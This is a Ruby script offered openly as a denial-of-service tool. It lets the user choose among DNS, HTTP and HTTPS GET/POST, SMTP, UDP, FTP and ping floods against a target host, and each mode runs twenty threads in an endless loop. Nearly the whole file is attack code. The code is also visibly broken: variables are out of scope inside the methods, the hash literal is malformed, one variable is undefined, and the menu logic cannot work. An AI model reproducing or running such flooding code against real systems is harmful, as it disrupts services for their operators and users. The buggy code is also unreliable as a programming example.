#!/usr/bin/ruby 
require 'socket'
require 'httpclient'
require 'thread'
require 'metainspector'
require 'net-dns'
host = ARGV[0]
url = "http://" + host
surl = "https://" + host
postdata = {'Content-Length' => 1000, 'd' => "abaabaabaabaabaabaabaabaabaabaabaabaabaabaabaabaabaabaabaabaabaabaabaabaabaabaabaabaabaaba", s = "abaabaabaabaabaabaabaabaabaabaabaabaabaabaabaabaabaabaabaabaabaabaabaabaabaabaabaabaabaaba"}
def pingflood
	while 2 == 2
		p1 = Thread.new{`ping #{host}`}	
		p2 = Thread.new{`ping #{host}`} 
		p3 = Thread.new{`ping #{host}`} 
		p4 = Thread.new{`ping #{host}`} 
		p5 = Thread.new{`ping #{host}`} 
		p6 = Thread.new{`ping #{host}`} 
		p7 = Thread.new{`ping #{host}`} 
		p8 = Thread.new{`ping #{host}`} 
		p9 = Thread.new{`ping #{host}`} 
		p10 = Thread.new{`ping #{host}`} 
		p11 = Thread.new{`ping #{host}`} 
		p12 = Thread.new{`ping #{host}`} 
		p13 = Thread.new{`ping #{host}`} 
		p14 = Thread.new{`ping #{host}`} 
		p15 = Thread.new{`ping #{host}`} 
		p16 = Thread.new{`ping #{host}`} 
		p17 = Thread.new{`ping #{host}`} 
		p18 = Thread.new{`ping #{host}`} 
		p19 = Thread.new{`ping #{host}`} 
		p20 = Thread.new{`ping #{host}`} 
	
		p1.join 
		p2.join 
		p3.join
		p4.join 
		p5.join 
		p6.join 
		p7.join 
		p8.join 
		p9.join
		p10.join
		p11.join
		p12.join 
		p13.join
		p14.join 
		p15.join 
		p16.join
		p17.join 
		p18.join
		p19.join 
		p20.join
	end
end 

def udpflood 
	ports = [53,67,123,135,137-138,161,445,631,1434]
	udp = UDPSocket.new
	while 2 == 2
		ports.each do |con|
			u1 = Thread.new{udp.send "hello",0, host, con}
			u2 = Thread.new{udp.send "hello",0, host, con}
			u3 = Thread.new{udp.send "hello",0, host, con} 
			u4 = Thread.new{udp.send "hello",0, host, con}
			u5 = Thread.new{udp.send "hello",0, host, con}
			u6 = Thread.new{udp.send "hello",0, host, con} 
			u7 = Thread.new{udp.send "hello",0, host, con}
			u8 = Thread.new{udp.send "hello",0, host, con} 
			u9 = Thread.new{udp.send "hello",0, host, con} 
			u10 = Thread.new{udp.send "hello",0, host, con} 
			u11 = Thread.new{udp.send "hello",0, host, con}
			u12 = Thread.new{udp.send "hello",0, host, con} 
			u13 = Thread.new{udp.send "hello",0, host, con}
			u14 = Thread.new{udp.send "hello",0, host, con} 
			u15 = Thread.new{udp.send "hello",0, host, con}
			u16 = Thread.new{udp.send "hello",0, host, con}
			u17 = Thread.new{udp.send "hello",0, host, con} 
			u18 = Thread.new{udp.send "hello",0, host, con}
			u19 = Thread.new{udp.send "hello",0, host, con} 
			u20 = Thread.new{udp.send "hello",0, host, con}
			u1.join
			u2.join
			u3.join
			u4.join 
			u5.join
			u6.join
			u7.join
			u8.join
			u9.join
			u10.join
			u11.join
			u12.join
			u13.join
			u14.join
			u15.join
			u16.join
			u17.join 
			u18.join
			u19.join
			u20.join 
		end
	end
end 

def dnsflood 
	recordnames = ["mx", "soa", "srv", "txt", "cname", "A", "AAA", "AXFR","AFSDB"]
		recordnames.each do |record|
			d1 = Thread.new{`nslookup #{host} #{record}`}
			d2 = Thread.new{`nslookup #{host} #{record}`}
			d3 = Thread.new{`nslookup #{host} #{record}`} 
			d4 = Thread.new{`nslookup #{host} #{record}`}
			d5 = Thread.new{`nslookup #{host} #{record}`} 
			d6 = Thread.new{`nslookup #{host} #{record}`} 
			d7 = Thread.new{`nslookup #{host} #{record}`}
			d8 = Thread.new{`nslookup #{host} #{record}`}
			d9 = Thread.new{`nslookup #{host} #{record}`}
			d10 = Thread.new{`nslookup #{host} #{record}`}
			d11 = Thread.new{`nslookup #{host} #{record}`}
			d12 = Thread.new{`nslookup #{host} #{record}`} 
			d13 = Thread.new{`nslookup #{host} #{record}`} 
			d14 = Thread.new{`nslookup #{host} #{record}`}
			d15 = Thread.new{`nslookup #{host} #{record}`} 
			d16 = Thread.new{`nslookup #{host} #{record}`}
			d17 = Thread.new{`nslookup #{host} #{record}`} 
			d18 = Thread.new{`nslookup #{host} #{record}`} 
			d19 = Thread.new{`nslookup #{host} #{record}`}
			d20 = Thread.new{`nslookup #{host} #{record}`}
			
			d1.join
			d2.join
			d3.join
			d4.join
			d5.join
			d6.join
			d7.join
			d8.join 
			d9.join 
			d10.join 
			d11.join 
			d12.join
			d13.join
			d14.join 
			d15.join 
			d16.join 
			d17.join 
			d18.join 
			d19.join
			d20.join
		

	end
end 

def getflood
	page = MetaInspector.new(host)
	while 2 == 2
		page.links.all.each do |targ|
			gf1 = Thread.new{HTTPClient.get(targ)}	
			gf2 = Thread.new{HTTPClient.get(targ)}
			gf3 = Thread.new{HTTPClient.get(targ)} 
			gf4 = Thread.new{HTTPClient.get(targ)}
			gf5 = Thread.new{HTTPClient.get(targ)}
			gf6 = Thread.new{HTTPClient.get(targ)}
			gf7 = Thread.new{HTTPClient.get(targ)}
			gf8 = Thread.new{HTTPClient.get(targ)}
			gf9 = Thread.new{HTTPClient.get(targ)}
			gf10 = Thread.new{HTTPClient.get(targ)}
			gf11 = Thread.new{HTTPClient.get(targ)}
			gf12 = Thread.new{HTTPClient.get(targ)}
			gf13 = Thread.new{HTTPClient.get(targ)}
			gf14 = Thread.new{HTTPClient.get(targ)}
			gf15 = Thread.new{HTTPClient.get(targ)}
			gf16 = Thread.new{HTTPClient.get(targ)}
			gf17 = Thread.new{HTTPClient.get(targ)}
			gf18 = Thread.new{HTTPClient.get(targ)}
			gf19 = Thread.new{HTTPClient.get(targ)}
			gf20 = Thread.new{HTTPClient.get(targ)}
			gf1.join
			gf2.join
			gf3.join 
			gf4.join 
			gf5.join
			gf6.join 
			gf7.join 
			gf8.join 
			gf9.join
			gf10.join
			gf11.join 
			gf12.join 
			gf13.join
			gf14.join  
			gf15.join 
			gf16.join 
			gf17.join 
			gf18.join 
			gf19.join 
			gf20.join 	
	
		end
	end 
end


def postflood 
	page = MetaInspector.new(host)
	while 2 == 2 	
		page.links.all.each do |ro|
	
			pf1 = Thread.new{HTTPClient.post(rg, postdata)}
			pf2 = Thread.new{HTTPClient.post(rg, postdata)}
			pf3 = Thread.new{HTTPClient.post(rg, postdata)} 
			pf4 = Thread.new{HTTPClient.post(rg, postdata)}
			pf5 = Thread.new{HTTPClient.post(rg, postdata)}
			pf6 = Thread.new{HTTPClient.post(rg, postdata)} 
			pf7 = Thread.new{HTTPClient.post(rg, postdata)} 
			pf8 = Thread.new{HTTPClient.post(rg, postdata)} 
			pf9 = Thread.new{HTTPClient.post(rg, postdata)} 
			pf10 = Thread.new{HTTPClient.post(rg, postdata)} 
			pf11 = Thread.new{HTTPClient.post(rg, postdata)} 
			pf12 = Thread.new{HTTPClient.post(rg, postdata)} 
			pf13 = Thread.new{HTTPClient.post(rg, postdata)} 
			pf14 = Thread.new{HTTPClient.post(rg, postdata)} 
			pf15 = Thread.new{HTTPClient.post(rg, postdata)} 
			pf16 = Thread.new{HTTPClient.post(rg, postdata)} 
			pf17 = Thread.new{HTTPClient.post(rg, postdata)} 
			pf18 = Thread.new{HTTPClient.post(rg, postdata)} 
			pf19 = Thread.new{HTTPClient.post(rg, postdata)} 
			pf20 = Thread.new{HTTPClient.post(rg, postdata)} 
			
			pf1.join
			pf2.join
			pf3.join
			pf4.join
			pf5.join 
			pf6.join
			pf7.join 
			pf8.join 
			pf9.join 
			pf10.join
			pf11.join 
			pf12.join 
			pf13.join
			pf14.join 
			pf15.join 
			pf16.join
			pf17.join 
			pf18.join 
			pf19.join 
			pf20.join 

		end 
	end
end 

def SMTPflood
	message = "EHLO aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"
	smtp = TCPSocket.new host, 25
	while 2 == 2 
		sm1 = Thread.new{smtp.send message} 
		sm2 = Thread.new{smtp.send message} 
		sm3 = Thread.new{smtp.send message} 
		sm4 = Thread.new{smtp.send message} 
		sm5 = Thread.new{smtp.send message} 
		sm6 = Thread.new{smtp.send message} 
		sm7 = Thread.new{smtp.send message} 
		sm8 = Thread.new{smtp.send message} 
		sm9 = Thread.new{smtp.send message} 
		sm10 = Thread.new{smtp.send message} 
		sm11 = Thread.new{smtp.send message} 
		sm12 = Thread.new{smtp.send message} 
		sm13 = Thread.new{smtp.send message} 
		sm14 = Thread.new{smtp.send message} 
		sm15 = Thread.new{smtp.send message}
		sm16 = Thread.new{smtp.send message} 
		sm17 = Thread.new{smtp.send message} 
		sm18 = Thread.new{smtp.send message} 
		sm19 = Thread.new{smtp.send message} 
		sm20 = Thread.new{smtp.send message} 
		
		sm1.join 
		sm2.join 
		sm3.join
		sm4.join 
		sm5.join
		sm6.join
		sm7.join
		sm8.join 
		sm9.join 
		sm10.join
		sm11.join 
		sm12.join
		sm13.join 
		sm14.join 
		sm15.join 
		sm16.join 
		sm17.join 
		sm18.join
		sm19.join
		sm20.join
	end 
end 


def httpspost
	
	pg = MetaInspector.new(surl)	
	while 2 == 2	
		pg.links.all.each do |link|
	
			hp1 = Thread.new{HTTPClient.post(link, postdata)}
			hp2 = Thread.new{HTTPClient.post(link, postdata)} 
			hp3 = Thread.new{HTTPClient.post(link, postdata)} 
			hp4 = Thread.new{HTTPClient.post(link, postdata)} 
			hp5 = Thread.new{HTTPClient.post(link, postdata)} 
			hp6 = Thread.new{HTTPClient.post(link, postdata)} 
			hp7 = Thread.new{HTTPClient.post(link, postdata)} 
			hp8 = Thread.new{HTTPClient.post(link, postdata)} 
			hp9 = Thread.new{HTTPClient.post(link, postdata)}
			hp10 = Thread.new{HTTPClient.post(link, postdata)} 
			hp11 = Thread.new{HTTPClient.post(link, postdata)} 
			hp12 = Thread.new{HTTPClient.post(link, postdata)} 
			hp13 = Thread.new{HTTPClient.post(link, postdata)} 
			hp14 = Thread.new{HTTPClient.post(link, postdata)} 
			hp15 = Thread.new{HTTPClient.post(link, postdata)} 
			hp16 = Thread.new{HTTPClient.post(link, postdata)} 
			hp17 = Thread.new{HTTPClient.post(link, postdata)}
			hp18 = Thread.new{HTTPClient.post(link, postdata)} 
			hp19 = Thread.new{HTTPClient.post(link, postdata)} 
			hp20 = Thread.new{HTTPClient.post(link, postdata)}
		
			hp1.join
			hp2.join
			hp3.join 
			hp4.join
			hp5.join 
			hp6.join
			hp7.join
			hp8.join
			hp9.join
			hp10.join
			hp11.join
			hp12.join
			hp13.join
			hp14.join
			hp15.join
			hp16.join
			hp17.join
			hp18.join
			hp19.join
			hp20.join
	end 	
		end
end 


def httpsget

	gpg = MetaInspector.new(surl)
	while 2 == 2
		gpg.links.all.each do |pages| 
	
			sg1 = Thread.new{HTTPClient.get(pages)}
			sg2 = Thread.new{HTTPClient.get(pages)} 
			sg3 = Thread.new{HTTPClient.get(pages)} 
			sg4 = Thread.new{HTTPClient.get(pages)} 
			sg5 = Thread.new{HTTPClient.get(pages)} 
			sg6 = Thread.new{HTTPClient.get(pages)} 
			sg7 = Thread.new{HTTPClient.get(pages)} 
			sg8 = Thread.new{HTTPClient.get(pages)} 
			sg9 = Thread.new{HTTPClient.get(pages)} 
			sg10 = Thread.new{HTTPClient.get(pages)} 
			sg11 = Thread.new{HTTPClient.get(pages)} 
			sg12 = Thread.new{HTTPClient.get(pages)} 
			sg13 = Thread.new{HTTPClient.get(pages)} 
			sg14 = Thread.new{HTTPClient.get(pages)} 
			sg15 = Thread.new{HTTPClient.get(pages)} 
			sg16 = Thread.new{HTTPClient.get(pages)} 
			sg17 = Thread.new{HTTPClient.get(pages)} 
			sg18 = Thread.new{HTTPClient.get(pages)} 
			sg19 = Thread.new{HTTPClient.get(pages)} 
			sg20 = Thread.new{HTTPClient.get(pages)}

			sg1.join
			sg2.join	
			sg3.join
			sg4.join
			sg5.join
			sg6.join
			sg7.join
			sg8.join
			sg9.join
			sg10.join
			sg11.join
			sg12.join
			sg13.join
			sg14.join
			sg15.join
			sg16.join
			sg17.join
			sg18.join	
			sg19.join
			sg20.join

		end 
	end
end

def ftpflood 
	ftpa = ["get /home/john/Documents", "put /home/john/Documents", "delete /home/pablo/Documents", "MKDIR /home/anthony/Documents", "pwd", "pwd", "rmdir /home/john/Documents"]
	fs = TCPSocket.new host, 21 
	while 2 == 2
		ftpa.each do |actions|
			ftp1 = Thread.new{fs.puts ftpa}
			ftp2 = Thread.new{fs.puts ftpa} 
			ftp3 = Thread.new{fs.puts ftpa} 
			ftp4 = Thread.new{fs.puts ftpa} 
			ftp5 = Thread.new{fs.puts ftpa} 
			ftp6 = Thread.new{fs.puts ftpa} 
			ftp7 = Thread.new{fs.puts ftpa} 
			ftp8 = Thread.new{fs.puts ftpa} 
			ftp9 = Thread.new{fs.puts ftpa} 
			ftp10 = Thread.new{fs.puts ftpa} 
			ftp11 = Thread.new{fs.puts ftpa} 
			ftp12 = Thread.new{fs.puts ftpa} 
			ftp13 = Thread.new{fs.puts ftpa} 	
			ftp14 = Thread.new{fs.puts ftpa} 
			ftp15 = Thread.new{fs.puts ftpa} 
			ftp16 = Thread.new{fs.puts ftpa} 	
			ftp17 = Thread.new{fs.puts ftpa} 	
			ftp18 = Thread.new{fs.puts ftpa} 
			ftp19 = Thread.new{fs.puts ftpa} 
			ftp20 = Thread.new{fs.puts ftpa} 
		
			ftp1.join
			ftp2.join
			ftp3.join 
			ftp4.join 
			ftp5.join
			ftp6.join
			ftp7.join
			ftp8.join
			ftp9.join
			ftp10.join 
			ftp11.join
			ftp12.join
			ftp13.join
			ftp14.join
			ftp15.join
			ftp16.join
			ftp17.join 
			ftp18.join
			ftp19.join
			ftp20.join
		end 		
	end

end 

def choice 
	thechoice = STDIN.gets.chomp 
	puts "Input the type of Attack you desire."
	puts "1 is for DNS Flooding"
	puts "2 is for HTTP Get Flooding"
	puts "3 is for HTTP Post Flooding"
	puts "4 is for SMTP Flooding"
	puts "5 is for UDP Flooding"
	puts "6 is for HTTPS Get flooding"
	puts "7 is for HTTPS POST flooding"
	puts "8 is for FTP Flooding"
	puts "9 is for ping flooding"
	if thechoice == 1
		dnsflood
	elsif thechoice == 2 
		getflood
	elsif thechoice == 3 
		postflood 
	elsif thechoice == 4 
		SMTPflood
	elsif thechoice == 5
		udpflood
	elsif thechoice == 6 
		httpsget 
	elsif thechoice == 7 
		httpspost
	elsif thechoice == 8
		ftpflood
	elsif thechoice == 9 
		pingflood
	else 
		puts "Unknown Option"
		exit 
	end
end 

choice 
